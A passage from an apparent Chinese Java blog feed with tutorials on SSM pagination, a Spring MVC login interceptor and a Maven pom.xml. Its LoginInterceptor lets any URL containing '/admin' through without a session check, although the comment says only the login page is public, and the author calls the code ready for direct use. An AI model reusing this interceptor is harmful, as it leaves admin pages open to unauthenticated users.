class="code"><pre><span class="line">public ModelAndView fonTable(Page page)&#123;</span><br><span class="line">        ModelAndView mav = new ModelAndView(&quot;admin/test&quot;);</span><br><span class="line">        int total = pictureService.getTotal();</span><br><span class="line">        System.out.println(&quot;Total&gt;&gt;&gt;&gt;&quot;+total);</span><br><span class="line">        page.calculateEnd(total);</span><br><span class="line">        if (page.getStart() &lt; 0) &#123;</span><br><span class="line">            page.setStart(0);</span><br><span class="line">        &#125;else if (page.getStart() &gt; total) &#123;</span><br><span class="line">            page.setEnd(page.getEnd());</span><br><span class="line">        &#125;</span><br><span class="line">        PageHelper.offsetPage(page.getStart(),16);</span><br><span class="line">        List&lt;PictureDate&gt; allPic = pictureService.listPic();</span><br><span class="line">        for (int i = 0;i &lt; allPic.size();i++) &#123;</span><br><span class="line">            System.out.println(allPic.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(allPic);</span><br><span class="line">        mav.addObject(&quot;allpic&quot;,allPic);</span><br><span class="line">        return mav;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p> 前端片段代码</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=&quot;am-disabled&quot;&gt;&lt;a href=&quot;?start=0&quot;&gt;«&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li class=&quot;am-active&quot;&gt;&lt;a href=&quot;?start=$&#123;page.getStart()-page.getCount()&#125;&quot;&gt;上一页&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;?start=$&#123;page.getStart()+page.getCount()&#125;&quot;&gt;下一页&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;?start=$&#123;page.getEnd()&#125;&quot;&gt;»&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div><p> 其实很多代码都省略了，比如entity，dao，service，mapper相关的代码我都省略了。<br> 立一个flag，写一个平台出一个详细的文章进行学习。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-ssm框架の拦截器</title>
      <link href="/2019/04/19/java-ssm-kuang-jia-nolan-jie-qi/"/>
      <url>/2019/04/19/java-ssm-kuang-jia-nolan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-ssm框架の拦截器"><a href="#Java-ssm框架の拦截器" class="headerlink" title="Java-ssm框架の拦截器"></a>Java-ssm框架の拦截器</h1><h2 id="为什么使用拦截器？"><a href="#为什么使用拦截器？" class="headerlink" title="为什么使用拦截器？"></a>为什么使用拦截器？</h2><blockquote><p>之前我一直再考虑是不是每次访问页面的时候都需要去考虑有没有存在session，再判断是否可以访问页面？其实差不多，拦截器就是干这个事情的，但是不需要你每次去做判断，只需要把你的拦截器写好，其他的就不用管了。</p></blockquote><h2 id="如何使用拦截器？"><a href="#如何使用拦截器？" class="headerlink" title="如何使用拦截器？"></a>如何使用拦截器？</h2><h3 id="1-1配置XML"><a href="#1-1配置XML" class="headerlink" title="1.1配置XML"></a>1.1配置XML</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 拦截器 --&gt;</span><br><span class="line">    &lt;mvc:interceptors&gt;</span><br><span class="line">        &lt;!-- 多个拦截器，顺序执行 --&gt;</span><br><span class="line">        &lt;mvc:interceptor&gt;</span><br><span class="line">            &lt;mvc:mapping path=&quot;/**&quot;/&gt;</span><br><span class="line">            &lt;!--不拦截静态资源--&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/*.css&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.css&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.js&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.png&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.gif&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.jpg&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.jpeg&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/label_ctl/*&quot; /&gt;</span><br><span class="line">            &lt;!--自定义拦截器--&gt;</span><br><span class="line">            &lt;bean class=&quot;com.label.interceptor.LoginInterceptor&quot; /&gt;</span><br><span class="line">        &lt;/mvc:interceptor&gt;</span><br><span class="line">    &lt;/mvc:interceptors&gt;</span><br></pre></td></tr></table></figure></div><h4 id="设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。"><a href="#设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。" class="headerlink" title="设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。"></a>设置拦截器有多种方法，这只是其中一种，更具自己如何构造SSM框架来决定把代码放在哪。</h4><blockquote><p> 完整XML文件spring-mvc.xml</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">       http://www.springframework.org/schema/mvc</span><br><span class="line">       http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd&quot;&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.label.controller&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;mvc:annotation-driven /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--指定文件夹下所有文件不会被DispatcherServlet拦截，直接访问--&gt;</span><br><span class="line">    &lt;mvc:resources mapping=&quot;/文件夹名称/**&quot; location=&quot;/文件夹名称/&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 拦截器 --&gt;</span><br><span class="line">    &lt;mvc:interceptors&gt;</span><br><span class="line">        &lt;!-- 多个拦截器，顺序执行 --&gt;</span><br><span class="line">        &lt;mvc:interceptor&gt;</span><br><span class="line">            &lt;mvc:mapping path=&quot;/**&quot;/&gt;</span><br><span class="line">            &lt;!--不拦截静态资源--&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/*.css&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.css&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.js&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.png&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.gif&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.jpg&quot;/&gt;</span><br><span class="line">            &lt;mvc:exclude-mapping path=&quot;/**/*.jpeg&quot;/&gt;</span><br><span class="line">            &lt;bean class=&quot;com.label.interceptor.LoginInterceptor&quot; /&gt;</span><br><span class="line">        &lt;/mvc:interceptor&gt;</span><br><span class="line">    &lt;/mvc:interceptors&gt;</span><br><span class="line"></span><br><span class="line">    &lt;mvc:default-servlet-handler /&gt;</span><br><span class="line">      &lt;!--指定服务view的文件夹及后缀名--&gt;</span><br><span class="line">    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot; /&gt;   </span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div><h3 id="1-2-自定义拦截器"><a href="#1-2-自定义拦截器" class="headerlink" title="1.2 自定义拦截器"></a>1.2 自定义拦截器</h3><p> 根据上面设置的目录下创建实例LoginInterceptor</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">package com.label.interceptor;</span><br><span class="line"></span><br><span class="line">import com.label.entity.User;</span><br><span class="line">import org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line">public class LoginInterceptor implements HandlerInterceptor &#123;</span><br><span class="line">    /**</span><br><span class="line">     * Handler执行完成之后调用这个方法</span><br><span class="line">     */</span><br><span class="line">    public void afterCompletion(HttpServletRequest request,</span><br><span class="line">                                HttpServletResponse response, Object handler, Exception exc)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Handler执行之后，ModelAndView返回之前调用这个方法</span><br><span class="line">     */</span><br><span class="line">    public void postHandle(HttpServletRequest request, HttpServletResponse response,</span><br><span class="line">                           Object handler, ModelAndView modelAndView) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Handler执行之前调用这个方法</span><br><span class="line">     */</span><br><span class="line">    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,</span><br><span class="line">                             Object handler) throws Exception &#123;</span><br><span class="line">        //获取请求的URL</span><br><span class="line">        String url = request.getRequestURI();</span><br><span class="line">        //URL:login.jsp是公开的;这个demo是除了login.jsp是可以公开访问的，其它的URL都进行拦截控制</span><br><span class="line">        if(url.indexOf(&quot;/admin&quot;)&gt;=0)&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        //获取Session</span><br><span class="line">        HttpSession session = request.getSession();</span><br><span class="line">        User user = (User) session.getAttribute(&quot;user&quot;);</span><br><span class="line"></span><br><span class="line">        if(user != null)&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        //不符合条件的，跳转到登录界面</span><br><span class="line">        request.getRequestDispatcher(&quot;/WEB-INF/views/admin/login.jsp&quot;).forward(request, response);</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>对于写后台的来说，上面基本是可以直接使用的。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA 简单创建SSM框架</title>
      <link href="/2019/04/08/idea-jian-dan-chuang-jian-ssm-kuang-jia/"/>
      <url>/2019/04/08/idea-jian-dan-chuang-jian-ssm-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="IDEA-简单创建SSM框架"><a href="#IDEA-简单创建SSM框架" class="headerlink" title="IDEA 简单创建SSM框架"></a>IDEA 简单创建SSM框架</h1><h2 id="SSM框架"><a href="#SSM框架" class="headerlink" title="SSM框架"></a>SSM框架</h2><blockquote><p> S:Spring框架  S:Spring-MVC  M:Mybatis</p></blockquote><h3 id="Spring框架"><a href="#Spring框架" class="headerlink" title="Spring框架"></a>Spring框架</h3><p>Spring 是一个轻量级的 DI / IoC 和 AOP 容器的开源框架。<br><img src="https://image.kalifun.top/upload/1904/b1df24e660b0706a.jpeg" alt="![](https://image.kalifun.top/upload/1904/b1df24e660b0706a.jpeg)"></p><h3 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring-MVC"></a>Spring-MVC</h3><p> 你可以理解Spring-MVC是Spring的一个模块。而MVC则是一种处理模式。现在很多框架都采用这种模式。<br> M：model是数据交互层。V：views是视图层。C：Controller是业务逻辑层。<br><img src="https://image.kalifun.top/upload/1904/2da1900edb713e3b.jpeg" alt="![](https://image.kalifun.top/upload/1904/2da1900edb713e3b.jpeg)"></p><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p> 在我们传统的 JDBC 中，我们除了需要自己提供 SQL 外，还必须操作 Connection、Statment、ResultSet，不仅如此，为了访问不同的表，不同字段的数据，我们需要些很多雷同模板化的代码，闲的繁琐又枯燥。</p><h2 id="1-Maven创建项目"><a href="#1-Maven创建项目" class="headerlink" title="1.Maven创建项目"></a>1.Maven创建项目</h2><p> 注意：</p><ul><li><p>已经安装jdk,maven(使用IDEA自带应该也是可以的)</p><h3 id="1-1创建步骤"><a href="#1-1创建步骤" class="headerlink" title="1.1创建步骤"></a>1.1创建步骤</h3><p><img src="https://image.kalifun.top/upload/1904/23ef84aa9eba8d01.png" alt="![](https://image.kalifun.top/upload/1904/23ef84aa9eba8d01.png)"><br>建议选择1吧。<br><img src="https://image.kalifun.top/upload/1904/7613f966a0034e59.png" alt="![](https://image.kalifun.top/upload/1904/7613f966a0034e59.png)"><br><img src="https://image.kalifun.top/upload/1904/7ed744f109877b82.png" alt="![7ed744f109877b82.png](https://image.kalifun.top/upload/1904/7ed744f109877b82.png)"><br><img src="https://image.kalifun.top/upload/1904/e71140fd484f9479.png" alt="![e71140fd484f9479.png](https://image.kalifun.top/upload/1904/e71140fd484f9479.png)"><br><img src="https://image.kalifun.top/upload/1904/e1f7c4a6f0d70052.png" alt="![e1f7c4a6f0d70052.png](https://image.kalifun.top/upload/1904/e1f7c4a6f0d70052.png)"><br>当出现了上面的字眼，就说明已经创建成功了。</p><h2 id="2-构造项目"><a href="#2-构造项目" class="headerlink" title="2.构造项目"></a>2.构造项目</h2><h3 id="2-1项目架构"><a href="#2-1项目架构" class="headerlink" title="2.1项目架构"></a>2.1项目架构</h3><p>先把项目按照图的架构来作准备。<br><img src="https://image.kalifun.top/upload/1904/879a384754458f38.png" alt="![879a384754458f38.png](https://image.kalifun.top/upload/1904/879a384754458f38.png)"></p><h3 id="2-2修改pom-xml"><a href="#2-2修改pom-xml" class="headerlink" title="2.2修改pom.xml"></a>2.2修改pom.xml</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">  Licensed to the Apache Software Foundation (ASF) under one</span><br><span class="line">  or more contributor license agreements.  See the NOTICE file</span><br><span class="line">  distributed with this work for additional information</span><br><span class="line">  regarding copyright ownership.  The ASF licenses this file</span><br><span class="line">  to you under the Apache License, Version 2.0 (the</span><br><span class="line">  &quot;License&quot;); you may not use this file except in compliance</span><br><span class="line">  with the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">   http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing,</span><br><span class="line">  software distributed under the License is distributed on an</span><br><span class="line">  &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY</span><br><span class="line">  KIND, either express or implied.  See the License for the</span><br><span class="line">  specific language governing permissions and limitations</span><br><span class="line">  under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- $Id: pom.xml 642118 2008-03-28 08:04:16Z reinhard $ --&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">  &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;ssmdemo&lt;/name&gt;</span><br><span class="line">  &lt;groupId&gt;ssmdemo&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;ssmdemo&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">      &lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;maven-jetty-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;6.1.7&lt;/version&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">          &lt;connectors&gt;</span><br><span class="line">            &lt;connector implementation=&quot;org.mortbay.jetty.nio.SelectChannelConnector&quot;&gt;</span><br><span class="line">              &lt;port&gt;8888&lt;/port&gt;</span><br><span class="line">              &lt;maxIdleTime&gt;30000&lt;/maxIdleTime&gt;</span><br><span class="line">            &lt;/connector&gt;</span><br><span class="line">          &lt;/connectors&gt;</span><br><span class="line">          &lt;webAppSourceDirectory&gt;$&#123;project.build.directory&#125;/$&#123;pom.artifactId&#125;-$&#123;pom.version&#125;&lt;/webAppSourceDirectory&gt;</span><br><span class="line">          &lt;contextPath&gt;/&lt;/contextPath&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">      &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">  &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;!-- 设置项目编码编码 --&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;</span><br><span class="line">    &lt;!-- spring版本号 --&gt;</span><br><span class="line">    &lt;spring.version&gt;4.3.5.RELEASE&lt;/spring.version&gt;</span><br><span class="line">    &lt;!-- mybatis版本号 --&gt;</span><br><span class="line">    &lt;mybatis.version&gt;3.4.1&lt;/mybatis.version&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;!--dependency&gt;</span><br><span class="line">      &lt;groupId&gt;ssmdemo&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;[the artifact id of the block to be mounted]&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;/dependency--&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- java ee --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;javax&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;javaee-api&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;7.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 单元测试 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 实现slf4j接口并整合 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- JSON --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.8.7&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!-- 数据库 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;5.1.41&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 数据库连接池 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;0.9.5.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- MyBatis --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;$&#123;mybatis.version&#125;&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- mybatis/spring整合包 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.3.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Spring --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      